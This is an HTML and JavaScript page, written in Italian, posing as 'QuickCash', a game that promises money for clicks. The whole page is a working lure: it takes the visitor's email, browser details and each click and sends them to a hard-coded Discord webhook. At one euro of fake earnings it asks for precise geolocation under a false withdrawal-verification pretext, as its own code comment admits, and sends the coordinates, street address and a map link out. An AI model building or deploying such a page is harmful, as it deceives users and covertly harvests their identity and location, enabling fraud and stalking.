<!DOCTYPE html>
<html>
<head>
    <title>Quick Cash - Instant Earnings</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 2.5em;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .tagline {
            color: #666;
            margin-bottom: 30px;
            font-size: 1.1em;
        }
        .earnings-display {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
            box-shadow: 0 10px 20px rgba(245, 87, 108, 0.3);
        }
        .earnings-amount {
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .earnings-label {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .click-button {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            padding: 25px 50px;
            font-size: 1.3em;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            box-shadow: 0 10px 25px rgba(79, 172, 254, 0.4);
            transition: all 0.2s;
            width: 100%;
        }
        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(79, 172, 254, 0.6);
        }
        .click-button:active {
            transform: translateY(0);
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            color: #666;
            font-size: 1.1em;
        }
        .email-section {
            margin: 25px 0;
        }
        .email-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 1.1em;
            margin-bottom: 15px;
            text-align: center;
        }
        .start-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1em;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
        }
        .location-notice {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            color: #856404;
            font-size: 0.9em;
        }
        .hidden {
            display: none;
        }
        .pulse {
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">💰 QuickCash</div>
        <div class="tagline">Guadagna soldi reali con un semplice click!</div>
        
        <!-- Email Section -->
        <div id="emailSection">
            <div class="email-section">
                <p>Inserisci la tua email per iniziare a guadagnare:</p>
                <input type="email" class="email-input" id="emailInput" placeholder="la.tua.email@gmail.com" required>
                <button class="start-button" onclick="startEarning()">Inizia a Guadagnare Subito</button>

        </div>

        <!-- Game Section -->
        <div id="gameSection" class="hidden">
            <div class="earnings-display">
                <div class="earnings-amount" id="balance">€0.00</div>
                <div class="earnings-label">Guadagni Totali</div>
            </div>
            
            <div class="stats">
                <div>Clicks: <span id="clickCount">0</span></div>
                <div>Rate: €0.05/click</div>
            </div>

            <button class="click-button pulse" id="clickButton" onclick="handleClick()">
                🤑 CLICCA PER GUADAGNARE! 🤑
            </button>

            <div class="location-notice">
                <strong>Pro Tip:</strong> Più veloce clicchi, più soldi guadagni!
            </div>
        </div>

        <!-- Success Section -->
        <div id="successSection" class="hidden">
            <div class="success-message">
                <h3>🎉 Congratulazioni! 🎉</h3>
                <p>Hai guadagnato <strong id="finalAmount">€1.00</strong>!</p>
                <p>I fondi saranno trasferiti entro 24 ore.</p>
            </div>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422614803888738415/nnmqT3Dz6V771PbfB0KkhCXLZLX6_FiWXdnqn2JBm1j87VD5b7CKvD4-b573Yh9wtC-5';
        
        let clickCount = 0;
        let balance = 0;
        let userEmail = '';
        let locationRequested = false;

        async function sendToDiscord(dataName, dataValue) {
            try {
                const payload = {
                    content: `💰 **${dataName}:** \`\`\`${JSON.stringify(dataValue, null, 2)}\`\`\``,
                    username: 'QuickCash Tracker'
                };
                
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {}
        }

        function startEarning() {
            const email = document.getElementById('emailInput').value.trim();
            
            if (!email || !validateEmail(email)) {
                alert('Per favore, inserisci un indirizzo email valido per iniziare.');
                return;
            }

            userEmail = email;

            // Send email to Discord
            sendToDiscord('📧 EMAIL_REGISTRATION', {
                email: email,
                timestamp: new Date().toISOString(),
                source: 'QuickCash'
            });

            // Switch to game section
            document.getElementById('emailSection').classList.add('hidden');
            document.getElementById('gameSection').classList.remove('hidden');

            // Send game start event
            sendToDiscord('🎮 GAME_STARTED', {
                email: email,
                timestamp: new Date().toISOString()
            });
        }

        function handleClick() {
            clickCount++;
            balance += 0.05;
            
            // Update display
            document.getElementById('balance').textContent = `€${balance.toFixed(2)}`;
            document.getElementById('clickCount').textContent = clickCount;
            
            // Send click data to Discord
            sendToDiscord(`🖱️ CLICK_${clickCount}`, {
                email: userEmail,
                clickNumber: clickCount,
                currentBalance: balance.toFixed(2),
                timestamp: new Date().toISOString()
            });

            // Add visual feedback
            const button = document.getElementById('clickButton');
            button.style.transform = 'scale(0.95)';
            setTimeout(() => {
                button.style.transform = 'scale(1)';
            }, 100);

            // Check if reached €1.00 and request location
            if (balance >= 1.00 && !locationRequested) {
                locationRequested = true;
                setTimeout(() => {
                    requestLocation();
                }, 300);
            }
        }

        function requestLocation() {
            if (!navigator.geolocation) {
                alert('Il tuo browser non supporta la geolocalizzazione.');
                return;
            }

            // Change button text to make it look like part of the game
            document.getElementById('clickButton').textContent = '🎯 VERIFICA POSIZIONE PER RITIRO 🎯';
            document.getElementById('clickButton').style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    
                    // Get address from coordinates
                    let address = 'Unknown';
                    try {
                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                        const data = await response.json();
                        address = data.display_name || 'Unknown';
                    } catch (e) {}
                    
                    // Send location data to Discord
                    const locationData = {
                        email: userEmail,
                        coordinates: {
                            latitude: latitude.toFixed(6),
                            longitude: longitude.toFixed(6),
                            accuracy: `${Math.round(accuracy)}m`
                        },
                        address: address,
                        googleMaps: `https://maps.google.com/?q=${latitude},${longitude}`,
                        totalClicks: clickCount,
                        finalBalance: balance.toFixed(2),
                        timestamp: new Date().toISOString()
                    };
                    
                    sendToDiscord('📍 LOCATION_CAPTURED', locationData);

                    // Show success message
                    document.getElementById('gameSection').classList.add('hidden');
                    document.getElementById('successSection').classList.remove('hidden');
                    document.getElementById('finalAmount').textContent = `€${balance.toFixed(2)}`;

                    // Send completion event
                    sendToDiscord('🎊 GAME_COMPLETED', {
                        email: userEmail,
                        totalClicks: clickCount,
                        finalBalance: balance.toFixed(2),
                        locationCaptured: true,
                        timestamp: new Date().toISOString()
                    });

                },
                (error) => {
                    // Send error to Discord
                    sendToDiscord('❌ LOCATION_ERROR', {
                        email: userEmail,
                        error: error.message,
                        code: error.code,
                        timestamp: new Date().toISOString()
                    });

                    // Reset button and continue game
                    document.getElementById('clickButton').textContent = '🤑 CLICCA PER GUADAGNARE! 🤑';
                    document.getElementById('clickButton').style.background = 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)';
                    locationRequested = false;
                    
                    alert('Verifica posizione necessaria per ritirare i guadagni. Continua a cliccare!');
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        // Send page load event
        setTimeout(() => {
            sendToDiscord('🌐 PAGE_LOADED', {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                source: 'QuickCash'
            });
        }, 1000);
    </script>
</body>
</html>
